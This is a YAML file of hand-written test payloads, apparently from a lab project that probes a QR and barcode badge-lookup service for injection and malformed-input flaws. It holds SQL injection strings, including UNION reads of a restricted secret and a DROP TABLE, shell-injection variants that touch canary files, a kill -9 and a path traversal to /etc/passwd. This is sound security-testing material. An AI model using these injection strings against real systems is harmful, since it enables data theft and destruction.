# The hand-written attack payloads for Tier 1 (the naive subset, plan.md section 6 and decision D7).
# Benign payloads are not listed here: attacks/payload_set.py derives them from the seeded badge database.
#
# Lab only (ethics/LAB_ONLY.md). Payloads are inert: the only commands are `touch` of the payload's own file in
# /canary, a bounded `sleep`, and `kill -9 $PPID` (which cannot kill the tier). tests/test_payloads.py enforces this.
# Every payload that writes a canary file names its own id, which is how oracle signal T1-D finds it.
payloads:
  # --- injection: SQL, into the badge lookup ---
  - {id: inj-sql-001, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "' OR '1'='1", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  - {id: inj-sql-002, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "x' OR 1=1 --", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  - {id: inj-sql-003, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "' OR ''='", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  - {id: inj-sql-004, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "B-000001' OR '1'='1", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  - {id: inj-sql-005, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "' OR active=1 --", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  - {id: inj-sql-006, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "' UNION SELECT id, holder, 1 FROM badges --", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  # --- injection: SQL that discloses the restricted canary secret (oracle signal C) ---
  - {id: inj-union-001, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "' UNION SELECT id, secret, 1 FROM badges WHERE id = 'R-000000", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  - {id: inj-union-002, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "x' UNION SELECT 'R-000000', secret, 1 FROM badges WHERE id='R-000000' --", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  # --- injection: a second statement, which sqlite3 rejects (E-012), so the tier faults instead of losing the table ---
  - {id: inj-stack-001, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "x'; DROP TABLE badges; --", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  # --- injection: shell, into the audit step (oracle signal D: the file named after the payload) ---
  - {id: inj-shell-001, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "x; touch /canary/inj-shell-001", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  - {id: inj-shell-002, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "x && touch /canary/inj-shell-002", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  - {id: inj-shell-003, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "x $(touch /canary/inj-shell-003)", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  - {id: inj-shell-004, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "x `touch /canary/inj-shell-004`", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  - {id: inj-shell-005, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "x | touch /canary/inj-shell-005", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  - {id: inj-shell-006, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "x > /canary/inj-shell-006", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  - {id: inj-shell-007, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "x\ntouch /canary/inj-shell-007", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  # --- injection: payloads with no effect or a bounded one ---
  - {id: inj-kill-001, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "x; kill -9 $PPID", oracle_ref: t1.default, seed: 1337, expected_decode: ok, notes: "cannot kill the tier: it is PID 1 in its container (E-015)"}
  - {id: inj-sleep-001, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "x; sleep 30", oracle_ref: t1.default, seed: 1337, expected_decode: ok, notes: "the tier's own 5 second shell timeout ends it"}
  - {id: inj-path-001, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "../../../etc/passwd", oracle_ref: t1.default, seed: 1337, expected_decode: ok, notes: "no path sink in Tier 1; here to show a family member with no applicable sink"}
  - {id: inj-path-002, family: injection, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "..%2f..%2fcanary%2finj-path-002", oracle_ref: t1.default, seed: 1337, expected_decode: ok, notes: "no path sink in Tier 1"}
  # --- malformed: oversized, control characters, NUL, empty, bad encodings, damaged symbols ---
  - {id: mal-quote-001, family: malformed, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "O'BRIEN", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  - {id: mal-long-001, family: malformed, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "", oracle_ref: t1.default, seed: 1337, expected_decode: ok, notes: "the largest byte-mode QR payload at error correction L (E-006)"}
  - {id: mal-long-002, family: malformed, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  - {id: mal-long-003, family: malformed, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "", oracle_ref: t1.default, seed: 1337, expected_decode: ok, notes: "the largest at error correction M (E-006)"}
  - {id: mal-ctrl-001, family: malformed, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "B-000001\r\n", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  - {id: mal-ctrl-002, family: malformed, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "B-00\e[31m01", oracle_ref: t1.default, seed: 1337, expected_decode: ok}
  - {id: mal-nul-001, family: malformed, subset: naive, target_tiers: [tier1], symbology: qr, content_b64: "Qi0wMDAwMDEAWA==", oracle_ref: t1.default, seed: 1337, expected_decode: ok, notes: "NUL survives both decoder modes (E-008); YAML text cannot carry it"}
  - {id: mal-empty-001, family: malformed, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "", oracle_ref: t1.default, seed: 1337, expected_decode: ok, notes: "an empty QR payload is a delivered empty string (E-008)"}
  - {id: mal-utf8-001, family: malformed, subset: naive, target_tiers: [tier1], symbology: qr, content_b64: "Qi0wMP/+", oracle_ref: t1.default, seed: 1337, expected_decode: ok, decoder_modes: [raw], notes: "invalid UTF-8: only the raw decoder condition can deliver it (E-008)"}
  - {id: mal-utf8-002, family: malformed, subset: naive, target_tiers: [tier1], symbology: qr, content_b64: "Y2Fm6Q==", oracle_ref: t1.default, seed: 1337, expected_decode: ok, decoder_modes: [raw], notes: "Latin-1 bytes: raw only"}
  - {id: mal-unicode-001, family: malformed, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "B-００１２３", oracle_ref: t1.default, seed: 1337, expected_decode: ok, notes: "fullwidth digits, valid UTF-8; the default decoder rewrites them (E-008)"}
  - {id: mal-trunc-001, family: malformed, subset: naive, target_tiers: [tier1], symbology: qr, content_text: "B-000001", oracle_ref: t1.default, seed: 1337, expected_decode: fail, damage: truncate, notes: "the lower half of the symbol is cut off, so it does not decode"}
  - {id: mal-trunc-002, family: malformed, subset: naive, target_tiers: [tier1], symbology: code128, content_text: "B-000001", oracle_ref: t1.default, seed: 1337, expected_decode: fail, damage: truncate}
